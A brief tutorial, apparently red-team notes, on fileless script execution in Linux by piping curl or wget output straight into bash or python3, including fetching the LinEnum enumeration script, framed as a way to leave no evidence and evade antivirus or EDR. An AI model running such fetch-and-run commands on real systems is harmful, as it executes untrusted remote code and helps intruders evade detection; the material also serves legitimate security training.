In Linux, you can **execute scripts directly in memory** using pipes (`|`).  
This method avoids saving the file to disk, making it **stealthy** and harder to detect.

## **1. Fileless Execution with `curl`**

If `curl` is available, run:

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

**How it works**

- Downloads the script from the URL.
    
- Pipes it directly into `bash` for immediate execution.
    
- Leaves no file saved to disk (unless output is redirected elsewhere).

## **2. Fileless Execution with `wget`**

If `wget` is installed:

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

**What the options mean:**

- `-q` → Quiet mode (no extra messages).
    
- `-O-` → Sends file output to **stdout** instead of saving.
    
- `| python3` → Pipes the script directly into the Python interpreter.
    

**Example output:**

```
Hello World!
```

## **3. Why This Matters**

- **No saved files** → little to no evidence left behind.
    
- **Bypasses basic detection** → useful for red-team operations or living-off-the-land (LOLBin) tactics.
    
- **Memory-only execution** → harder for antivirus or EDR to flag.

## **Tips**

- Always test scripts in a safe environment first.
    
- Consider HTTPS for better integrity and security.
    
- For persistence or debugging, redirect the script to a file before execution:
    

```bash
wget https://example.com/script.sh -O temp.sh && bash temp.sh
```
